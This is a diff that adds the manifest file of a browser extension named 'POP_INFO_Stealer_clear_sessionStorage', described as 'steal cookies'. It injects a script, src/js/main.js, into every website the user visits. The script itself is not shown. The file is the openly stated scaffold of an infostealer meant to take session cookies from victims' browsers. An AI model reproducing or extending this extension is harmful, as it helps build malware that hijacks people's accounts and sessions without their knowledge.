@@ -1,0 +1,18 @@
+{
+  "manifest_version": 2,
+  "name": "POP_INFO_Stealer_clear_sessionStorage",
+  "version": "1.0.0",
+
+  "description": "steal cookies pop by shiky8.",
+
+  "icons": {
+    "48": "src/icons/pop_cookie.ico"
+  },
+
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["src/js/main.js"]
+    }
+  ]
+}
